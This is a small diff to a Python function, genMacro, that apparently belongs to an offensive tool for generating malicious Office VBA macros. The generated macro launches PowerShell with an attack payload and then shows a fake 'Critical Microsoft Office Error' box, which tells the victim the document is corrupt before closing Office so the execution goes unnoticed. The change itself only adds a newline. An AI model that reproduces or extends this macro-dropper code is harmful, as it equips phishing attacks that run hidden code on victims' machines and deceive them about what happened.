@@ -222,7 +222,7 @@ def genMacro(full_attack, LineLength=380):
     macro_str = macro_str.replace("& ", "", 1)
 
     # end of macro
-    macro_str += """"Shell ("POWERSHELL.EXE " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
+    macro_str += """"\nShell ("POWERSHELL.EXE " & x)\nDim title As String\ntitle = "Critical Microsoft Office Error"\nDim msg As String\nDim intResponse As Integer\nmsg = "This document appears to be corrupt or missing critical rows in order to restore. Please restore this file from a backup."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
     return macro_str
 
 
